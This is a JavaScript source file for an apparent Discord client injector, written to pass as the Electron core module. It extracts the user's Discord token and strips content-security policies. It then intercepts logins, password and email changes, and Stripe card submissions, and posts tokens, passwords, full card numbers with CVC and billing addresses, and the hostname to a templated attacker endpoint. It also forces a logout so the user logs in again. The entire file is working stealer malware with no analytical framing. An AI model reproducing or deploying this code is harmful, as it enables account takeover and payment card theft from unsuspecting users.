const fs = require("fs"),
    path = require("path"),
    {
        BrowserWindow: BrowserWindow,
        session: session
    } = require("electron"),
    querystring = require("querystring"),
    os = require("os");
const computerName = os.hostname(),
    discordInstall = `${__dirname}`,
    EvalToken = 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;';

function FirstTime() {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`${EvalToken}`, !0).then(e => {
        if (fs.existsSync(path.join(__dirname, "init"))) {
            fs.rmdirSync(path.join(__dirname, "init"))
            BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();\nxhr.open("POST", "%HOST_URL%/init?id=%ID%", true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.setRequestHeader('Access-Control-Allow-Origin', '*');\nxhr.send(JSON.stringify({token:"${e}", computerName: "${computerName}", dirName: "${__dirname}"}));`, !0).then(e => {})
            BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', !0).then(e => {})
            return !0
        }
        return !1
    })
}
session.defaultSession.webRequest.onHeadersReceived((e, t) => {
    e.url.startsWith('%HOST_URL%') ? e.url.includes("discord.com") ? t({
        responseHeaders: Object.assign({
            "Access-Control-Allow-Headers": "*"
        }, e.responseHeaders)
    }) : t({
        responseHeaders: Object.assign({
            "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*"
        }, e.responseHeaders)
    }) : (delete e.responseHeaders["content-security-policy"], delete e.responseHeaders["content-security-policy-report-only"], t({
        responseHeaders: {
            ...e.responseHeaders,
            "Access-Control-Allow-Headers": "*"
        }
    }))
});
const Filter = {
    urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
};

function Login(t, n) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();\nxhr.open("POST", "%HOST_URL%/login?id=%ID%", true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.setRequestHeader('Access-Control-Allow-Origin', '*');\nxhr.send(JSON.stringify({password:"${t}", token:"${n}", computerName: "${computerName}", dirName: "${__dirname}"}));`, !0).then(e => {})
}

function ChangePassword(e, t, n) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();\nxhr.open("POST", "%HOST_URL%/changepasswd?id=%ID%", true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.setRequestHeader('Access-Control-Allow-Origin', '*');\nxhr.send(JSON.stringify({old_password:"${e}", new_password:"${t}", token:"${n}", computerName: "${computerName}", dirName: "${__dirname}"}));`, !0).then(e => {})
}

function ChangeEmail(t, n) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();\nxhr.open("POST", "%HOST_URL%/changeemail?id=%ID%", true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.setRequestHeader('Access-Control-Allow-Origin', '*');\nxhr.send(JSON.stringify({password:"${t}", token:"${n}", computerName: "${computerName}", dirName: "${__dirname}"}));`, !0).then(e => {})
}

function CreditCardAdded(e, t, n, r, a, s, o, i, l, p) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();\nxhr.open("POST", "%HOST_URL%/cc?id=%ID%", true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.setRequestHeader('Access-Control-Allow-Origin', '*');\nxhr.send(JSON.stringify({cc: {number: "${e}", cvc: "${t}", exp: "${n}/${r}", street: "${a}", city: "${s}", state: "${o}", zip: "${i}", country: "${l}"}, token: "${p}"}));`, !0).then(e => {})
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => {
    !e.url.startsWith("wss://") ? (FirstTime(), t({})) : t({
        cancel: !0
    })
});
const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
    if (e.url.endsWith("login") && 200 == e.statusCode) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),
            r = t.password;
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
            Login(r, e)
        })
    }
    if (e.url.endsWith("users/@me") && 200 == e.statusCode && "PATCH" == e.method) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
        if (t.password) {
            if (t.new_password) {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
                    ChangePassword(t.password, t.new_password, e)
                })
            }
            if (t.email) {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
                    ChangeEmail(t.password, e)
                })
            }
        }
    }
    if (e.url.endsWith("tokens")) {
        const t = BrowserWindow.getAllWindows()[0],
            n = querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));
        t.webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
            CreditCardAdded(n["card[number]"], n["card[cvc]"], n["card[exp_month]"], n["card[exp_year]"], n["card[address_line1]"], n["card[address_city]"], n["card[address_state]"], n["card[address_zip]"], n["card[address_country]"], e)
        })
    }
}), module.exports = require("./core.asar");